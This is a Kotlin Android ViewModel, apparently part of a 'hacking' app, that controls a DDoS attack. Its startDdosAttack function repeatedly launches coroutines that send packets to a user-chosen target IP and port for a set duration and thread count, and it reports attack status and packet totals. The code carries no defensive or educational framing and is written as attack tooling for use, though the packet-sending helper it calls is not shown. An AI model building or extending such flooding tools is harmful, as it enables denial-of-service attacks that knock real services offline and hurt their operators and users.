package com.xyrenn.hacking.ui.tools.network

import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.xyrenn.hacking.utils.helpers.NetworkHelper
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class DdosViewModel @Inject constructor(
    private val networkHelper: NetworkHelper
) : ViewModel() {

    private val _isAttacking = MutableLiveData(false)
    val isAttacking: LiveData<Boolean> = _isAttacking

    private val _status = MutableLiveData("Ready")
    val status: LiveData<String> = _status

    private val _packetsSent = MutableLiveData(0)
    val packetsSent: LiveData<Int> = _packetsSent

    private var attackJob: kotlinx.coroutines.Job? = null
    private var packetCount = 0

    fun startDdosAttack(targetIp: String, port: Int, durationSeconds: Int, threads: Int) {
        attackJob = viewModelScope.launch {
            _isAttacking.value = true
            _status.value = "Attacking $targetIp:$port with $threads threads"
            packetCount = 0

            val endTime = System.currentTimeMillis() + (durationSeconds * 1000)

            while (System.currentTimeMillis() < endTime && _isAttacking.value == true) {
                // Simulate sending packets with multiple threads
                for (i in 1..threads) {
                    launch {
                        networkHelper.sendPacket(targetIp, port)
                        packetCount++
                    }
                }
                _packetsSent.value = packetCount
                delay(10)
            }

            _isAttacking.value = false
            _status.value = "Attack finished. Sent $packetCount packets"
        }
    }

    fun stopAttack() {
        attackJob?.cancel()
        _isAttacking.value = false
        _status.value = "Attack stopped"
    }
}